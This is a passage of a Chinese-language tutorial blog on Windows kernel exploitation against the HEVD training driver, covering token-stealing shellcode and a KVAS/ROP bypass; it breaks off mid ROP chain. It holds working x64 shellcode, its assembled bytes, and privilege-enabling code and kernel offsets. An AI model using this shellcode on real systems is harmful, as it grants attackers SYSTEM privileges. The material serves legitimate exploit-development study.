src="https://img.joe1sn.top/uploads/big/bd96556683f06ae537f449787700abd7.png" alt="image-20240119183328877" /></p><p><img src="https://img.joe1sn.top/uploads/big/84780c5e389c5cc5645419cd3ec999ec.png" alt="image-20240119183538886" /></p><p><img src="https://img.joe1sn.top/uploads/big/9345344e4adc9083467b09c76f86fa74.png" alt="image-20240119183521964" /></p><p><img src="https://img.joe1sn.top/uploads/big/9ad936fd2b23d649493103c25b0cad43.png" alt="image-20240119183609699" /></p><h2 id="b-进行shellcode编写"><a class="markdownIt-Anchor" href="#b-进行shellcode编写"></a> B. 进行Shellcode编写</h2><p>在刚才的<code>EPROCESS</code>中，有一段记录的是程序的链表：<code>ActiveProcessLinks</code>，而且windows会生成一段独特的标识来标记每一个程序：<code>UniqueProcessId</code>，在这段 <strong>双向</strong> 链表上每段程序都可以被找到，因为可以向前和向后查找，<strong>一般System位于链表开头，所以沿着Flink查找</strong></p><p><img src="https://img.joe1sn.top/uploads/big/f5708429025f321352aa000e50780c46.png" alt="image-20240119193844612" /></p><p><img src="https://img.joe1sn.top/uploads/big/0595f0087054b0dca2dee10c43392202.png" alt="image-20240119193859162" /></p><p><img src="https://img.joe1sn.top/uploads/big/6065735bb4a5fd9a9d01cdf05b408bc7.png" alt="image-20240119194420366" /></p><ol><li><p>通过<code>EPROCESS</code>获得自身<code>ActiveProcessLinks</code>，同时向前/向后查找</p><p><a href="https://connormcgarr.github.io/x64-Kernel-Shellcode-Revisited-and-SMEP-Bypass/">这篇文章</a>中通过模仿<code>PsGetCurrentProcess</code>，<code>gs:[188h]</code>指向的是一个<code>_KTHREAD </code>，函数的汇编会将这个地址<code>add addr,0xb8</code>，就得到了当前进程的<code>_EPROCESS</code>，这也是许多shellcode的技巧</p><p><img src="https://img.joe1sn.top/uploads/big/7d19f373ab80dd77cee7f9bafa5963c9.png" alt="image-20240120111712416" /></p><p><img src="https://img.joe1sn.top/uploads/big/74dee9c22c569abe177a9d8a2227fa80.png" alt="image-20240120112417119" /></p><p><code>ffff9984d3d97080 </code>就为一个 当前进程的<code>KiInitialThread </code></p><p><code>+0xB8</code>指向的是当前进程的<code>EPROCESS</code>了</p><p><img src="https://img.joe1sn.top/uploads/big/264e3eb8c9addd711fc3d6642ba7917a.png" alt="image-20240120112153274" /></p><p><img src="https://img.joe1sn.top/uploads/big/253b49550220b0df56641a0ce6cd73b2.png" alt="image-20240120112206849" /></p></li><li><p>比较当前<code>ActiveProcessLinks</code>值<code>-8</code>的内存地址是否为<code>UniqueProcessId</code></p></li><li><p>否：更换当前结构体为下一个</p></li><li><p>是：从<code>ActiveProcessLinks-0x70</code>的位置得到<code>Token</code>地址</p></li><li><p>解析Token，赋值给<strong>当前进程</strong>（Windows会自动解析为exp的程序（从页表映射等来看确实应该如此））</p></li></ol><p>仔细逆向会发现</p><p><img src="https://img.joe1sn.top/uploads/big/e3e923aeebb6ddde277f7232637d651d.png" alt="image-20240120105543669" /></p><p>那么在没有任何栈变动的情况下<code>add rsp, 0x28</code>就能恢复栈，但是我们只有了ROP，ROP链中存在两个<code>ret</code>和一个<code>pop</code>，抬栈了0x18，所以在shellcode中只需要<code>add rsp, 0x10</code></p><p><img src="https://img.joe1sn.top/uploads/big/dbc0a6a596ddb6db46f6a3a920c17dbf.png" alt="image-20240120105533497" /></p><p>同时HEVD的<code>NT_STATUS</code>使用<code>RAX</code>检测处理是否成功，所以要<code>xor rax,rax</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">[Bits 64]</span><br><span class="line"></span><br><span class="line">_start:    </span><br><span class="line">    xor rax, rax</span><br><span class="line">    mov rax, gs:[rax+0x188]</span><br><span class="line">    mov rax, [rax+0xb8]     ;rax = 当前EPROCESS</span><br><span class="line">    mov r9, rax             ;r9  = 当前EPROCESS</span><br><span class="line">    mov rax, [rax+0x448]    ;rax = 当前EPROCESS.List</span><br><span class="line">    mov rax, [rax]          ;rax = 当前EPROCESS.List-&gt;flink</span><br><span class="line"></span><br><span class="line">__loop:</span><br><span class="line">    mov rdx, [rax-0x8]      ;rdx = 上一个进程的 upid</span><br><span class="line">    mov r8, rax             ;r8  = 当前EPROCESS.List-&gt;flink</span><br><span class="line">    mov rax, [rax]          ;rax = 上一个进程的.List</span><br><span class="line">    cmp rdx, 0x4</span><br><span class="line">    jnz __loop</span><br><span class="line"></span><br><span class="line">    ;rdx = 4</span><br><span class="line">    ;r8 = System EPROCESS</span><br><span class="line">    mov rdx, [r8+0x70]      ;rdx = system token</span><br><span class="line">    and rdx, -0x8           ;消除低4位</span><br><span class="line">    mov rcx, [r9+0x4b8]     ;当前EPROCESS的token</span><br><span class="line">    and rcx, 0x7            ;</span><br><span class="line">    add rdx, rcx            ;rdx = 系统token高位+当前token低4位</span><br><span class="line">    mov [r9+0x4b8], rdx     ;将合成的token复制给当前</span><br><span class="line"></span><br><span class="line">    add rsp, 0x10</span><br><span class="line">    retn</span><br></pre></td></tr></table></figure><p>使用nasm</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&amp; &quot;C:\Users\xxxx\AppData\Local\bin\NASM\nasm.exe&quot; -f win64 .\TokenSteal.asm -o .\TokenSteal.bin</span><br></pre></td></tr></table></figure><p>编译出的文件位COFF格式，要提取出来，这里我用的是<code>CFF Explore</code>的快速反汇编定位到代码然后用<code>HxD</code>提取的</p><p><img src="https://img.joe1sn.top/uploads/big/fd7286caaeb3160933b88c897f0315a3.png" alt="image-20240120110131666" /></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> <span class="type">char</span> cmd[<span class="number">84</span>] = &#123;</span><br><span class="line"><span class="number">0x48</span>, <span class="number">0x31</span>, <span class="number">0xC0</span>, <span class="number">0x65</span>, <span class="number">0x48</span>, <span class="number">0x8B</span>, <span class="number">0x80</span>, <span class="number">0x88</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x48</span>,</span><br><span class="line"><span class="number">0x8B</span>, <span class="number">0x80</span>, <span class="number">0xB8</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x49</span>, <span class="number">0x89</span>, <span class="number">0xC1</span>, <span class="number">0x48</span>, <span class="number">0x8B</span>, <span class="number">0x80</span>,</span><br><span class="line"><span class="number">0x48</span>, <span class="number">0x04</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x48</span>, <span class="number">0x8B</span>, <span class="number">0x00</span>, <span class="number">0x48</span>, <span class="number">0x8B</span>, <span class="number">0x50</span>, <span class="number">0xF8</span>, <span class="number">0x49</span>,</span><br><span class="line"><span class="number">0x89</span>, <span class="number">0xC0</span>, <span class="number">0x48</span>, <span class="number">0x8B</span>, <span class="number">0x00</span>, <span class="number">0x48</span>, <span class="number">0x83</span>, <span class="number">0xFA</span>, <span class="number">0x04</span>, <span class="number">0x75</span>, <span class="number">0xF0</span>, <span class="number">0x49</span>,</span><br><span class="line"><span class="number">0x8B</span>, <span class="number">0x50</span>, <span class="number">0x70</span>, <span class="number">0x48</span>, <span class="number">0x83</span>, <span class="number">0xE2</span>, <span class="number">0xF8</span>, <span class="number">0x49</span>, <span class="number">0x8B</span>, <span class="number">0x89</span>, <span class="number">0xB8</span>, <span class="number">0x04</span>,</span><br><span class="line"><span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x48</span>, <span class="number">0x83</span>, <span class="number">0xE1</span>, <span class="number">0x07</span>, <span class="number">0x48</span>, <span class="number">0x01</span>, <span class="number">0xCA</span>, <span class="number">0x49</span>, <span class="number">0x89</span>, <span class="number">0x91</span>,</span><br><span class="line"><span class="number">0xB8</span>, <span class="number">0x04</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x48</span>, <span class="number">0x31</span>, <span class="number">0xC0</span>, <span class="number">0x48</span>, <span class="number">0x83</span>, <span class="number">0xC4</span>, <span class="number">0x10</span>, <span class="number">0xC3</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><img src="https://img.joe1sn.top/uploads/big/c0d0423c8f27b5c1bf5d53ab7948a4b9.png" alt="image-20240120105950658" /></p><p><img src="https://img.joe1sn.top/uploads/big/22bab2bb970e84dfa0c194ec6f01567a.png" alt="image-20240120110002444" /></p><h2 id="c-分析上一篇的shellcode"><a class="markdownIt-Anchor" href="#c-分析上一篇的shellcode"></a> C. 分析上一篇的shellcode</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">BYTE cmd[<span class="number">256</span>] = &#123;</span><br><span class="line"><span class="number">0x48</span>, <span class="number">0x31</span>, <span class="number">0xc0</span>, <span class="number">0x65</span>, <span class="number">0x48</span>, <span class="number">0x8b</span>, <span class="number">0x80</span>, <span class="number">0x88</span>, <span class="number">0x01</span>, <span class="number">0x00</span>,</span><br><span class="line"><span class="number">0x00</span>, <span class="number">0x48</span>, <span class="number">0x8b</span>, <span class="number">0x80</span>, <span class="number">0xb8</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x49</span>, <span class="number">0x89</span>,</span><br><span class="line"><span class="number">0xc1</span>, <span class="number">0x48</span>, <span class="number">0x8b</span>, <span class="number">0x80</span>, <span class="number">0x48</span>, <span class="number">0x04</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x48</span>, <span class="number">0x8b</span>,</span><br><span class="line"><span class="number">0x00</span>, <span class="number">0x48</span>, <span class="number">0x8b</span>, <span class="number">0x50</span>, <span class="number">0xf8</span>, <span class="number">0x49</span>, <span class="number">0x89</span>, <span class="number">0xc0</span>, <span class="number">0x48</span>, <span class="number">0x8b</span>,</span><br><span class="line"><span class="number">0x00</span>, <span class="number">0x48</span>, <span class="number">0x83</span>, <span class="number">0xfa</span>, <span class="number">0x04</span>, <span class="number">0x75</span>, <span class="number">0xf0</span>, <span class="number">0x49</span>, <span class="number">0x8b</span>, <span class="number">0x50</span>,</span><br><span class="line"><span class="number">0x70</span>, <span class="number">0x48</span>, <span class="number">0x83</span>, <span class="number">0xe2</span>, <span class="number">0xf8</span>, <span class="number">0x49</span>, <span class="number">0x8b</span>, <span class="number">0x89</span>, <span class="number">0xb8</span>, <span class="number">0x04</span>,</span><br><span class="line"><span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x48</span>, <span class="number">0x83</span>, <span class="number">0xe1</span>, <span class="number">0x07</span>, <span class="number">0x48</span>, <span class="number">0x01</span>, <span class="number">0xca</span>, <span class="number">0x49</span>,</span><br><span class="line"><span class="number">0x89</span>, <span class="number">0x91</span>, <span class="number">0xb8</span>, <span class="number">0x04</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x65</span>, <span class="number">0x48</span>, <span class="number">0x8b</span>, <span class="number">0x04</span>,</span><br><span class="line"><span class="number">0x25</span>, <span class="number">0x88</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x66</span>, <span class="number">0x8b</span>, <span class="number">0x88</span>, <span class="number">0xe4</span>, <span class="number">0x01</span>,</span><br><span class="line"><span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x66</span>, <span class="number">0xff</span>, <span class="number">0xc1</span>, <span class="number">0x66</span>, <span class="number">0x89</span>, <span class="number">0x88</span>, <span class="number">0xe4</span>, <span class="number">0x01</span>,</span><br><span class="line"><span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x48</span>, <span class="number">0x8b</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x48</span>,</span><br><span class="line"><span class="number">0x8b</span>, <span class="number">0x8a</span>, <span class="number">0x68</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x4c</span>, <span class="number">0x8b</span>, <span class="number">0x9a</span>, <span class="number">0x78</span>,</span><br><span class="line"><span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x48</span>, <span class="number">0x8b</span>, <span class="number">0xa2</span>, <span class="number">0x80</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line"><span class="number">0x48</span>, <span class="number">0x8b</span>, <span class="number">0xaa</span>, <span class="number">0x58</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x31</span>, <span class="number">0xc0</span>, <span class="number">0x0f</span>,</span><br><span class="line"><span class="number">0x01</span>, <span class="number">0xf8</span>, <span class="number">0x48</span>, <span class="number">0x0f</span>, <span class="number">0x07</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>,</span><br><span class="line"><span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>,</span><br><span class="line"><span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>,</span><br><span class="line"><span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>,</span><br><span class="line"><span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>,</span><br><span class="line"><span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>,</span><br><span class="line"><span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>,</span><br><span class="line"><span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>,</span><br><span class="line"><span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>,</span><br><span class="line"><span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>,</span><br><span class="line"><span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>,</span><br><span class="line"><span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>写入一个二进制文档，用ida逆向</p><p><img src="https://img.joe1sn.top/uploads/big/ad5f9f69c5c817f016f3af5ca4717316.png" alt="image-20240119202727334" /></p><p>发现原理一致，最后对栈的恢复不同</p><p>已知<code>gs:[0x188]</code>指向一个<code>_KTHREAD</code>结构体</p><p><img src="https://img.joe1sn.top/uploads/big/f0a5031af56eee9d505358818846a94e.png" alt="image-20240120112824920" /></p><p>根据windbg的调试结果知道</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">mov cx, [rax+0x1e4];+0x1e4 KernelApcDisable : 0n-1</span><br><span class="line">inc cx;</span><br><span class="line">mov [rax+0x1e4], cx;更新KernelApcDisable为0</span><br><span class="line">mov rdx, [rax+0x90];+0x090 [TrapFrame]: 0xfffff88e`1d2edb00 </span><br><span class="line">;_KTRAP_FRAME</span><br><span class="line">;---下面为_KTRAP_FRAME</span><br><span class="line">mov rcx, [rdx+0x168];[+0x168] Rip</span><br><span class="line">mov r11, [rdx+0x178];[+0x178] EFlags</span><br><span class="line">mov rsp, [rdx+0x180];[+0x180] Rsp</span><br><span class="line">mov rbp, [rdx+0x158];[+0x158] Rbp</span><br></pre></td></tr></table></figure><p><img src="https://img.joe1sn.top/uploads/big/6a427f532364b38c531a30c8e66922c5.png" alt="image-20240120113526235" /></p><p>可能还是有点😵，反汇编一下<code>TrapFrame</code>的RIP</p><p><img src="https://img.joe1sn.top/uploads/big/c053402edbe07075e363de45ec014e8d.png" alt="image-20240120113739799" /></p><p>相当于通过<code>TrapFrame</code>，替换了exp中的<code>DeviceIoControl</code>（模仿正常执行），并让他正常返回</p><p>接着重定位GS寄存器，使用sysret返回，为了对齐，有的汇编是这样的写的</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">o64 sysret; nasm shit</span><br></pre></td></tr></table></figure><h2 id="d-开启token所有权限-优化shellcode"><a class="markdownIt-Anchor" href="#d-开启token所有权限-优化shellcode"></a> D. 开启Token所有权限 [优化shellcode]</h2><p>即使我们已经成功生成了令牌，但是功能依旧是不全的</p><p><img src="https://img.joe1sn.top/uploads/big/f5b2dd61f571c1edcc1a160ddd63139a.png" alt="image-20240120114406196" /></p><p>被禁用的功能依旧有很多</p><h3 id="i-开启当前权限为启用"><a class="markdownIt-Anchor" href="#i-开启当前权限为启用"></a> I. 开启当前权限为启用</h3><p>重新打开一个普通用户的<code>cmd.exe</code></p><p><img src="https://img.joe1sn.top/uploads/big/c2da1e221a9d8e62c9a4ae27901bf004.png" alt="image-20240120125235344" /></p><p>用A部分的方法找到该进程</p><p><img src="https://img.joe1sn.top/uploads/big/50a5f3dc61a7e608b21298558bec4cd4.png" alt="image-20240120125516929" /></p><p>查看token格式，对照一下SID。（注意低位要为0）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">!token &lt;Token数值，但是个位数为0&gt;</span><br></pre></td></tr></table></figure><p><img src="https://img.joe1sn.top/uploads/big/c3cdd2d87ff279e4761888663f50107e.png" alt="image-20240120125615410" /></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dt !_sep_token_privileges 0xffffb106`ecc96060+0x40</span><br></pre></td></tr></table></figure><p><img src="https://img.joe1sn.top/uploads/big/33d8902ffc4e5dedfac463bebb0bd38e.png" alt="image-20240120130022681" /></p><p>将Enabled值设置为Present值</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eq 0xffffb106`ecc96060+0x40+8 0x00000006`02880000</span><br></pre></td></tr></table></figure><p><img src="https://img.joe1sn.top/uploads/big/cbe5b50b2b24ebedaefea6bf4e406ea0.png" alt="image-20240120130054144" /></p><p>查看权限</p><p><img src="https://img.joe1sn.top/uploads/big/d3567ad9cbcbac4a49c839f81cb11751.png" alt="image-20240120130116310" /></p><h3 id="ii-获得所有权限并启用"><a class="markdownIt-Anchor" href="#ii-获得所有权限并启用"></a> II. 获得所有权限并启用</h3><p>用A部分的方法得到System的Token</p><p><img src="https://img.joe1sn.top/uploads/big/b44eaf47a38695dc4a35d9f25a958054.png" alt="image-20240120130740237" /></p><p>再得到SystemToken的Present值</p><p><img src="https://img.joe1sn.top/uploads/big/a8398e0631de11a93f09ef3f4d3c4dee.png" alt="image-20240120132052083" /></p><p>设置当前Token的Present和Enabled为该值</p><p><img src="https://img.joe1sn.top/uploads/big/70610eb7cea6455cb6dcd0032cb200b3.png" alt="image-20240120132313137" /></p><p>查看权限</p><p><img src="https://img.joe1sn.top/uploads/big/06841330f3a322ab5896df99084d3acf.png" alt="image-20240120132350635" /></p><h3 id="iii重新编写shellcode"><a class="markdownIt-Anchor" href="#iii重新编写shellcode"></a> III.重新编写shellcode</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">[Bits 64]</span><br><span class="line"></span><br><span class="line">_start:    </span><br><span class="line">    xor rax, rax</span><br><span class="line">    mov rax, gs:[rax + 0x188]</span><br><span class="line">    mov rax, [rax + 0xb8]     ;rax = 当前EPROCESS</span><br><span class="line">    mov r9, rax               ;r9  = 当前EPROCESS</span><br><span class="line">    mov rax, [rax + 0x448]    ;rax = 当前EPROCESS.List</span><br><span class="line">    mov rax, [rax]            ;rax = 当前EPROCESS.List-&gt;flink</span><br><span class="line"></span><br><span class="line">__loop:</span><br><span class="line">    mov rdx, [rax - 0x8]      ;rdx = 上一个进程的 upid</span><br><span class="line">    mov r8, rax               ;r8  = 当前EPROCESS.List-&gt;flink</span><br><span class="line">    mov rax, [rax]            ;rax = 上一个进程的.List</span><br><span class="line">    cmp rdx, 0x4</span><br><span class="line">    jnz __loop</span><br><span class="line"></span><br><span class="line">    ;rdx = 4</span><br><span class="line">    ;r8 = System EPROCESS</span><br><span class="line">    mov rdx, [r8+0x70]      ;rdx = system token</span><br><span class="line">    and rdx, -0x8           ;消除低4位</span><br><span class="line">    mov rcx, [r9+0x4b8]     ;当前EPROCESS的token</span><br><span class="line">    and rcx, 0x7            ;</span><br><span class="line">    add rdx, rcx            ;rdx = 系统token高位+当前token低4位</span><br><span class="line">    mov [r9+0x4b8], rdx     ;将合成的token复制给当前</span><br><span class="line"></span><br><span class="line">    ;Enable ALL</span><br><span class="line">    mov rdx, [r8 + 0x70]      ;rdx = system token</span><br><span class="line">    and rdx, 0xFFFFFFFFFFFFFFF0           ;system token: 消除低8位，便于解析Token</span><br><span class="line">    mov rbx, [rdx + 0x40]     ;rbx = System token的Present</span><br><span class="line">    mov rcx, [r9 + 0x4b8]     ;rcx = 新的EPROCESS的token</span><br><span class="line">    and rcx, 0xFFFFFFFFFFFFFFF0           ;new current token: 消除低8位，便于解析Token</span><br><span class="line">    mov [rcx + 0x40], rbx</span><br><span class="line">    mov [rcx + 0x48], rbx</span><br><span class="line"></span><br><span class="line">    xor rax, rax</span><br><span class="line">    add rsp, 0x10</span><br><span class="line">    retn</span><br></pre></td></tr></table></figure><p><img src="https://img.joe1sn.top/uploads/big/7a422f59bf47ec0ff9c55f9f9d5c580d.png" alt="image-20240120134710391" /></p><h1 id="kvas"><a class="markdownIt-Anchor" href="#kvas"></a> KVAS</h1><h2 id="a-简介"><a class="markdownIt-Anchor" href="#a-简介"></a> A. 简介</h2><p>KVAS全称是Kernel Virtual Address Shadow，它的出现与MeltDown（CVE-2017-5754）和TotalMeltDown（CVE-2018-1038）有关。</p><p>我的描述不一定准确，大致上来说这两个漏洞利用了CPU的乱序执行技术，即CPU在执行时不一定会按照流程执行。当我们访问一个不能被用户模式访问的内存页时，CPU会执行该语句然后将其缓存到内存中，等到发现不能访问后返回错误，但是该数据依旧存在于缓存当中。利用这种思路就可以完全读取内核中的数据，实现权限提升等。</p><p>微软为了缓解该漏洞，从用户页表中隔离出内核页表，让用户态访问到的内核页表也是经过映射的，并且会将用户页表自动标记为NX，让我们的shellcode无法执行</p><h2 id="b-bypass"><a class="markdownIt-Anchor" href="#b-bypass"></a> B. Bypass</h2><p>虽然用户页表为不可执行，<strong>但是内核页表仍然可执行</strong>，只不过会延长我们ROP链的长度</p><p>需要用到的函数是：<code>ExAllocatePoolWithTag</code>和<code>RtlCopyMemory</code></p><ul><li><code>ExAllocatePoolWithTag</code>：用于在内核中开辟一块地址</li><li><code>RtlCopyMemory</code>：复制内存到内核开辟的内存池</li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">LPVOID space = <span class="built_in">ExAllocatePoolWithTag</span>(<span class="number">0</span>, <span class="number">0x100</span>, <span class="number">0xDEAD</span>);</span><br><span class="line"><span class="comment">//NonPagedPoolExecute = 0</span></span><br><span class="line"><span class="comment">//空间大小：0x100</span></span><br><span class="line"><span class="built_in">RtlCopyMemory</span>(space, shellcode_addr, <span class="number">0x100</span>);</span><br></pre></td></tr></table></figure><p>MSDN中说明该两个函数在内核中均位于<code> NtosKrnl.exe</code>里，我们可以利用第一章的内容寻找到该地址，可以使用CFF Explorer查看导出表找到函数</p><p><img src="https://img.joe1sn.top/uploads/big/866de1aad36e03df79f0a3f799ca2e72.png" alt="image-20240120143139338" /></p><p><img src="https://img.joe1sn.top/uploads/big/59a09be3f8b2929ced592f3a4901f054.png" alt="image-20240120143245405" /></p><p>需要说明的一点是<code>ExAllocatePoolWithTag</code>有一个很恶心的地方就是</p><p><img src="https://img.joe1sn.top/uploads/big/324967fd2b7f547949278ef9bfa00206.png" alt="image-20240120213553032" /></p><p>这三个mov会打乱我们精心设计的ROP链，而且后面根本没有使用到他，所以要直接进入<code>push rdi</code>的位置</p><p><code>RtlCopyMemory</code>其实是一个宏</p><p><img src="https://img.joe1sn.top/uploads/big/9bb79876c8b14924e6704969dc963280.png" alt="image-20240120155359370" /></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> base = <span class="built_in">ulGetKernelBase</span>((PCHAR)<span class="string">&quot;ntoskrnl.exe&quot;</span>);</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> ulExAllocatePoolWithTag = base + <span class="number">0x9B203F</span>;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> ulRtlCopyMemory = base + <span class="number">0x40BEC0</span>;</span><br></pre></td></tr></table></figure><p>根据微软的函数调用规则，传参顺序是<code>rcx</code>，<code>rdx</code>，<code>r8</code>，返回地参数在<code>rax</code>中</p><p>那么一个理想的ROP布局</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">pop rcx rdx r8 ret</span><br><span class="line">0</span><br><span class="line">0x100</span><br><span 